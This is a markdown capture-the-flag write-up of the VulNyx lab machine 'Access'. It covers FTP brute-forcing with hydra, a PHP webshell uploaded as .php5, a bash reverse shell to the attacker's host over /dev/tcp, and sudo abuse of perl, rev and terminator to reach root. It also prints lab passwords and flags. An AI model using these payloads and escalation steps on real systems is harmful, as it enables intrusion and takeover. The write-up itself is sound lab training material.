@@ -1,0 +1,363 @@
+---
+title: Access
+date: '2026-02-26'
+description: ''
+type: writeup
+platform: vulnyx
+tags:
+  - Easy
+  - LINUX
+cover: /mc/uploads/2025/06/umz.png
+---
+
+# بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
+
+
+In this write-up, I will be walking through the process of hacking the machine 'Access' on the VulNyx platform.
+
+## Reconnaissance 
+
+so as usual, we began the process with reconnaissance, utilizing Nmap to gather initial information about the target.
+
+```bash
+nmap 192.168.138.138 -A -sCV
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-26 16:16 -0500
+Nmap scan report for 192.168.138.138
+Host is up (0.00060s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
+|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
+|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
+80/tcp   open  http    nginx 1.18.0
+|_http-server-header: nginx/1.18.0
+|_http-title: Welcome to nginx!
+5555/tcp open  ftp     pyftpdlib 1.5.8
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|  Connected to: 192.168.138.138:5555
+|  Waiting for username.
+|  TYPE: ASCII; STRUcture: File; MODE: Stream
+|  Data connection closed.
+|_End of status.
+6666/tcp open  http    websockets 11.0.3 (Python 3.9)
+|_http-server-header: Python/3.9 websockets/11.0.3
+|_http-title: Site doesn't have a title (text/plain).
+MAC Address: 08:00:27:42:50:7C (Oracle VirtualBox virtual NIC)
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+so we got some open ports 6666 runs a websocker with python and 5555 runs a ftpservice with 'pyftpdlib'
+
+### FTP Anonymous Check
+
+so we found nothing on the port 80 just a nginx page , and the 5555 doesnt accept the anonymous access 
+
+```bash
+ftp 192.168.138.138 -p 5555
+Connected to 192.168.138.138.
+220 pyftpdlib 1.5.8 ready.
+Name (192.168.138.138:kali): anonymous
+331 Username ok, send password.
+Password: 
+530 Anonymous access not allowed.
+ftp: Login failed
+ftp> 
+```
+### WebSocket Enumeration (Port 6666)
+
+so we gonna try to see what port 6666 so to do that we need a binary named websocat to act as client and send the commands or establish a connection with the server websockets 11.0.3 (Python 3.9)
+first if you dont have the websocat you should install it from Github https://github.com/vi/websocat/releases/tag/v1.14.1
+
+```bash 
+cd /tmp
+wget -O websocat https://github.com/vi/websocat/releases/download/v1.14.1/websocat.x86_64-unknown-linux-musl
+chmod +x websocat
+sudo mv websocat /usr/local/bin/
+websocat --version
+websocat 1.14.1
+```
+so we gonna connect with the port 6666
+
+```bash
+websocat ws://192.168.138.138:6666
+Hello noname,
+Change your FTP password as soon as possible your server is at risk.
+Regards!
+```
+
+### FTP Brute-force
+
+so here we got a new information about a user named "noname" and hes password is probably weak or guessable so we gonna try to bruteforce it 
+
+
+```bash
+hydra -l noname -P /usr/share/wordlists/rockyou.txt -s 5555 -t 16 -I -f 192.168.138.138 ftp
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra)
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ftp://192.168.138.138:5555/
+[STATUS] 288.00 tries/min, 288 tries in 00:01h, 14344111 to do in 830:06h, 16 active
+[5555][ftp] host: 192.168.138.138   login: noname   password: phoenix
+[STATUS] attack finished for 192.168.138.138 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra)
+```
+
+and we found the password now we can authenticate as noname and see the ftp content it was just the home page nginx html code
+
+```bash
+ftp 192.168.138.138 -p 5555
+Connected to 192.168.138.138.
+220 pyftpdlib 1.5.8 ready.
+Name (192.168.138.138:kali): noname
+331 Username ok, send password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering extended passive mode (|||44523|).
+125 Data connection already open. Transfer starting.
+-rwxrwxrwx   1 www-data www-data      612 Oct 20  2023 index.nginx-debian.html
+226 Transfer complete.
+```
+### Initial Upload Attempt
+
+after the authenticate we tried to to upload a shell but nothing works bcs the php are not executable,
+and served as static file so we can get the shell with php 
+```bash
+ftp> ls
+229 Entering extended passive mode (|||49441|).
+125 Data connection already open. Transfer starting.
+-rwxrwxrwx   1 www-data www-data      612 Oct 20  2023 index.nginx-debian.html
+-rw-r--r--   1 noname   noname         23 Feb 26 21:58 shell.php
+```
+
+### Extension Fuzzing for RCE
+
+but we NEVER GIVE UP , and we gonna try more extension to see if we can get the RCE , so we gonna start with these extensions :
+.phtml, .php5, .phar, .cgi, .pl, .py, .sh
+
+and we successfully found the right extension that gonna gives us the rce it was php5
+
+first we gonna craft our payload 
+```php
+<?php system($_GET["cmd"]); ?>
+```
+and we gonna try to trigger this shell with curl or access from browser ,but before start do not forget to start a netcat 
+
+```bash
+curl "http://192.168.138.138/x.php5?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.138.137/4444+0>%261'"
+```
+
+and in our listener 
+
+```bash
+nc -vlntp 4444       
+listening on [any] 4444 ...
+connect to [192.168.138.137] from (UNKNOWN) [192.168.138.138] 54756
+bash: cannot set terminal process group (320): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@access:~/html$ ls
+ls
+home
+index.nginx-debian.html
+x.cgi
+x.phar
+x.php
+x.php5
+x.phtml
+x.pl
+x.py
+x.sh
+```
+### Privilege Escalation: www-data → noname
+
+so after getting the shell we see if we can escalate to noname or find something that lead us to move privilege
+so after looking around we found that the user www-data can use perl without password and that is good for us 
+
+```bash
+www-data@access:~/html$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on access:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on access:
+    (noname) NOPASSWD: /usr/bin/perl
+```
+first we can see if we can execute commands with perl
+A small note:
+perl is a scripting language like python , think of it as a python's dad :) (jk) , we can also execute system command with perl .
+
+we can start with small ones like id whoami and we can go for webshell after that 
+
+
+```bash
+www-data@access:~/html$ sudo -u noname perl -e 'system("id")'
+sudo -u noname perl -e 'system("id")'
+uid=1000(noname) gid=1000(noname) groups=1000(noname)
+```
+here we can see that we aer noname when we execute the perl commands , and that is good , so after that we can try to create a ssh key and inject it in the authorized_keys and authenticate with noname easily 
+
+so first we gonna create the sshkey in our host
+
+```bash
+ssh-keygen -t ed25519 -f ~/.ssh/noname_key 
+cat ~/.ssh/noname_key.pub
+```
+copy the content of the noname_key.pub in the next commands
+
+```
+www-data@access:~/html$ sudo -u noname /usr/bin/perl -e 'system("mkdir -p /home/noname/.ssh && chmod 700 /home/noname/.ssh")'
+www-data@access:~/html$ sudo -u noname /usr/bin/perl -e 'system("echo \"<YOUR_PUBKEY_HERE>\" >> /home/noname/.ssh/authorized_keys")'
+www-data@access:~/html$ sudo -u noname /usr/bin/perl -e 'system("chmod 600 /home/noname/.ssh/authorized_keys && chown -R noname:noname /home/noname/.ssh")'
+```
+and finaly we can authenticate as noname with the ssh key
+
+```
+kali$ ssh -i ~/.ssh/noname_key noname@192.168.138.138
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+noname@access:~$ sudo -l
+Matching Defaults entries for noname on access:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User noname may run the following commands on access:
+    (powerful) NOPASSWD: /usr/bin/rev
+```
+### Privilege Escalation: noname → powerful
+
+so we can run the rev binary without password as powerful user , and because of its a custom binary it was a spanish binary (Lo siento Wilson)
+
+just from some hints in the errors i found out that the binary accept a file as arguments 
+
+```bash
+noname@access:~$ /usr/bin/rev --help
+Modo de empleo: rev [opciones] [fichero ...]
+
+Invierte líneas carácter a carácter.
+
+Opciones:
+ -h, --help     muestra esta ayuda
+ -V, --version  muestra la versión
+
+Para más detalles véase rev(1).
+noname@access:~$ /usr/bin/rev --version
+rev de util-linux 2.36.1
+noname@access:~$ /usr/bin/rev w
+rev: no se puede abrir w: No existe el fichero o el directorio
+noname@access:~$ /usr/bin/rev ~/user.txt
+5f79bca1ee2be14c3c587235e9c0f2b6
+noname@access:~$ cat user.txt
+6b2f0c9e532785c3c41eb2ee1acb97f5
+```
+so the binary is reversing the words so we need to escalate to the user powerful , but we dont know the content or the files in his home directory
+first i tried to common and the basic file that exist in every Linux OS , like bash-history
+
+```bash
+noname@access:~$ sudo -u powerful /usr/bin/rev /home/powerful/.bash_history
+lufrewop dwssap
+
+Gn1kc4H_fo_R3w0p_3hT
+Gn1kc4H_fo_R3w0p_3hT
+
+tixe
+noname@access:~$ echo 'Gn1kc4H_fo_R3w0p_3hT' | rev
+Th3_p0w3R_of_H4ck1nG
+so we got the password of the user powerful 'Th3_p0w3R_of_H4ck1nG'
+
+```bash
+noname@access:~$ su powerful
+Contraseña: 
+powerful@access:/home/noname$ cd ~
+powerful@access:~$ sudo -l
+Matching Defaults entries for powerful on access:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User powerful may run the following commands on access:
+    (ALL : ALL) NOPASSWD: /usr/bin/terminator, /usr/bin/xauth
+```
+### Privilege Escalation: powerful → root
+
+the user can execute these commands without password but what are these commands 
+first we gonna set diplay environement so GUI app can start  and avoid this error 'You need to run terminator in an X environment. Make sure $DISPLAY is properly set'
+```bash
+powerful@access:~$ export DISPLAY=:10
+```
+after that we gonna set XAUTHORITY point to the .XAUTHORITY , but if the .Xauhtority doesnt exist create it 
+```
+powerful@access:~$ export XAUTHORITY=/home/powerful/.Xauthority
+```
+but if the .Xauhtority doesnt exist create it 
+```bash
+touch ~/.Xauthority
+chmod 600 ~/.Xauthority
+xauth add :10 . $(mcookie)
+```
+after that check the cookies with this command :
+```bash
+powerful@access:~$ xauth list #this one for the powerful user
+access/unix:10  MIT-MAGIC-COOKIE-1  e06f7ceb8ab5a87921db88d52002d007
+powerful@access:~$ sudo xauth list  #this one for the root user
+xauth:  file /root/.Xauthority does not exist
+```
+the env should look like this in the first current terminal 
+
+```bash
+powerful@access:~$ env
+<snip>
+XAUTHORITY=/home/powerful/.Xauthority
+.
+.
+.
+USER=powerful
+DISPLAY=:10
+<snip>
+```
+so after checking you need to open a new terminal and ssh to powerful user with the option -x
+
+```bash
+ssh -X powerful@192.168.138.138
+powerful@192.168.138.138's password: 
+powerful@access:~$ env
+# check if Display changes
+DISPLAY=localhost:10.0
+```
+after that we gonna execute the last command that let us to be the root 
+
+```
+powerful@access:~$ sudo DISPLAY=$DISPLAY XAUTHORITY=$XAUTHORITY /usr/bin/terminator -x /bin/bash -c 'chmod 4755 /bin/bash'
+
+(terminator:638): dbind-WARNING **: 00:59:32.554: Couldn't connect to accessibility bus: Failed to connect to socket /run/user/1000/at-spi/bus_0: No existe el fichero o el directorio
+ConfigBase::load: Unable to open /etc/xdg/terminator/config ([Errno 2] No existe el fichero o el directorio: '/etc/xdg/terminator/config')
+Unable to connect to DBUS Server, proceeding as standalone
+powerful@access:~$ ls -al /bin/bash
+-rwsr-xr-x 1 root root 1234376 mar 27  2022 /bin/bash
+powerful@access:~$ /bin/bash -p
+bash-5.1# whoami
+root
+```
+
+ROOTED
+
+SOME BLA BLA BLA but its important :
+
+Display is where GUI windows should open.
+- `DISPLAY=:10` usually points to a local X display on the target.
+- after `ssh -X`, it often becomes something like `localhost:10.0`, which is an X11 tunnel through SSH.
+
+`xauth` manages the authentication cookie stored in `~/.Xauthority`.
+That cookie is like a key: even if sudo runs `terminator` as root, the app still needs a valid DISPLAY + valid Xauthority cookie to connect to the X server.
+Without both, you get: `Unable to init server / Make sure $DISPLAY is properly set`.
